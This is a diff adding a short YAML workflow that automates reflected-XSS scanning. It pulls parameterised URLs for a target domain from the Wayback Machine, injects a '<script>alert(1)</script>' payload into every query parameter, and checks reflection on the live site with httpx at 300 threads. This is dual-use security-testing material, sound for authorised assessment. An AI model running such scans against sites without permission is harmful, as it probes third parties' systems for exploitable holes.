@@ -1,0 +1,25 @@
+vars:
+  DOMAIN: ""
+  OUTPUT_DIR: "results"
+parallel: false
+modules:
+  - name: fetch-urls-from-wayback
+    cmds:
+      - mkdir -p {{OUTPUT_DIR}}
+      - echo {{DOMAIN}} | waybackurls | grep '=' > {{OUTPUT_DIR}}/filtered-urls.txt
+    silent: false
+
+  - name: replace-querystring
+    cmds:
+      - cat {{OUTPUT_DIR}}/filtered-urls.txt | qsreplace "<script>alert(1)</script>" > {{OUTPUT_DIR}}/replaced-urls.txt
+    silent: true
+
+  - name: checking-reflection
+    cmds:
+      - cat {{OUTPUT_DIR}}/replaced-urls.txt | httpx -silent -threads 300 -ms "<script>alert(1)</script>" > {{OUTPUT_DIR}}/final-results.txt
+    silent: true
+
+  - name: cleaning-temp-files
+    cmds:
+      - rm {{OUTPUT_DIR}}/filtered-urls.txt {{OUTPUT_DIR}}/replaced-urls.txt
+    silent: true
